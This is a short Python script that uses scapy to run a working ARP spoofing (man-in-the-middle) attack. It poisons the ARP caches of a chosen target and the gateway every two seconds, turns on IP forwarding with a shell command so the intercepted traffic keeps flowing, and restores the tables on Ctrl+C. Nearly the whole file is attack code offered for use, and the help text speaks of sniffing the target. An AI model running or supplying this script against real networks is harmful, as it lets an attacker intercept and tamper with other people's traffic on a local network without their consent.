import scapy.all as scapy
import time
import optparse
import subprocess

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target_ip", help="Target ip that we want to sniff")
    parser.add_option("-r", "--router", dest="gateway_ip", help="Gateway ip that we want to sniff")
    (options, arguments) = parser.parse_args()
    if not options.target_ip:
        parser.error("[+] Please specify a target ip , use --help for more info.")
    elif not options.gateway_ip:
        parser.error("[+] Please specify a gateway ip , use --help for more info.")
    return options
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(dest_ip, src_ip):
    dest_mac = get_mac(dest_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, count=4, verbose=False)


options = get_arguments()
target_ip = options.target_ip
gateway_ip = options.gateway_ip

try:
    subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets sent: " + str(sent_packets_count), end="")
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C ..... Resetting ARP tables ")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)